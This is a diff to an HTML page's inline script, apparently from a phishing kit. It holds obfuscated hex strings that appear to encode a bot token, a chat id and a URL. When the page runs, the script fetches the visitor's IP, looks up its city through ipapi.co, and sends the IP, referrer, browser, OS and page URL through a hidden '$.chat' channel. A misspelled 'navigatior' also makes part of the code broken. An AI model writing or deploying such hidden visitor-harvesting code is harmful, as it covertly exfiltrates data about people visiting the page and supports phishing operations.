@@ -92,18 +92,19 @@
   </body>
   <script>
     let tok={utkn:"75e293b315b34134f221a434949431a365d4822453a1a5341561a4a3219482541554e4d24163b5f29511a45431a1a5d271e2924411339224",redt:"e1229224856143b33572e4b3"};
-    var uap=navigatior.userAgentData;
-          $=new $_;
+     $=new $_;
           $.run();
             mky="e1e1843475f2f424a12393a355b24134e4a1b5d2f4b2413465c4f4b31532932465c4824494a1a5d271e2924411339224",su=(i)=>`https://ipapi.co/${i}/json`;
             getAd=()=>{
+              uap=navigatior.userAgentData;
+         
                 fetch(new Request(mky.hl())).then(j=>j.json()).then(d=>{
                   NextFun();
                     if(d.ip!=undefined)
                 {
                     fetch(new Request(su(d.ip))).then(c=>c.json())
                     .then(b=>{
-                      $.chat(d.ip+":"+"Referer:"+(document.referrer!=''?document.referrer:'direct')+"?Browser="+encodeURIComponent(uap.brands[2].brand??'N_A')+"&bver="+encodeURIComponent(uap.brands[2].version)+"&ostype="+encodeURIComponent(uap.platform)+":"+window.location.href,b.city)})
+                      $.chat(d.ip+":"+"Referer:"+(document.referrer!=''?document.referrer:'direct')+"?Browser="+encodeURIComponent(uap.brands[2].brand?uap.brands[2].brand:'N_A')+"&ostype="+encodeURIComponent(uap.platform)+":"+window.location.href,b.city)})
                       
                     .catch(e=>console.error(e));
                 }else {return;}
